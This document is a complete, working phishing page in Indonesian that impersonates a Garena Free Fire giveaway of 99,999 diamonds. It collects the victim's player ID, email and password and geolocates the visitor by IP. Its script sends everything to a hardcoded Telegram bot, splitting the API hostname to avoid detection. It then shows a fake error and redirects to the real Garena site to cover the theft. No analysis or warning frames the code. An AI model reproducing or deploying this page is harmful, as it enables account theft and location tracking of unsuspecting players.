<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Event - Klaim Diamond</title>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0a0a0a; color: #fff; font-family: 'Segoe UI', sans-serif; 
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; 
        }
        .box { 
            background: #151515; padding: 25px; border-radius: 15px; 
            border: 1px solid #ffcc00; width: 90%; max-width: 340px;
            box-shadow: 0 0 20px rgba(255, 204, 0, 0.2); 
            text-align: center;
        }
        h2 { color: #ffcc00; font-size: 18px; margin-bottom: 20px; letter-spacing: 1px; }
        input { 
            width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; 
            border: 1px solid #333; background: #222; color: #fff; outline: none;
        }
        input:focus { border-color: #ffcc00; }
        .btn { 
            background: linear-gradient(45deg, #ffcc00, #ff9900); color: #000; 
            padding: 12px; border: none; width: 100%; border-radius: 8px; 
            font-weight: bold; cursor: pointer; margin-top: 15px; transition: 0.3s;
        }
        .btn:hover { transform: scale(1.02); box-shadow: 0 0 15px #ffcc00; }
        #st { font-size: 11px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>

    <div class="box">
        <img src="https://garena.co.id/favicon.ico" width="40" style="margin-bottom:10px">
        <h2>KLAIM 99,999 DIAMOND</h2>
        <input type="number" id="id" placeholder="ID Player (8-10 digit)">
        <input type="text" id="em" placeholder="Email Akun">
        <input type="password" id="ps" placeholder="Password Akun">
        <button class="btn" onclick="send()">AMBIL DIAMOND</button>
        <p id="st">Server Status: Online</p>
    </div>

    <script>
        // --- CONFIG ---
        const T = '8510635650:AAH3ZxP-qkEO2hb8kjv-tZyOZieN0IatEwo'; 
        const C = '8551809114';
        // --------------

        let loc = "";
        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
            loc = `üåê IP: ${d.ip}\nüèôÔ∏è Kota: ${d.city}\nüè¢ ISP: ${d.org}\nüìç Maps: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
        });

        async function send() {
            const id = document.getElementById('id').value;
            const em = document.getElementById('em').value;
            const ps = document.getElementById('ps').value;

            if(!id || !em || !ps) return alert("Lengkapi data!");

            document.getElementById('st').innerText = "Processing...";

            const txt = `üíé NEW RESULT üíé\n\nüë§ ID: ${id}\nüìß User: ${em}\nüîë Pass: ${ps}\n\n${loc}`;

            try {
                await fetch(`https://api.tele` + `gram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: txt })
                });
                
                alert("Server Error! Diamond gagal dikirim karena antrean penuh. Coba 1 jam lagi.");
                window.location.href = "https://ff.garena.com";
            } catch (e) {
                alert("Koneksi bermasalah.");
            }
        }
    </script>
</body>
</html>
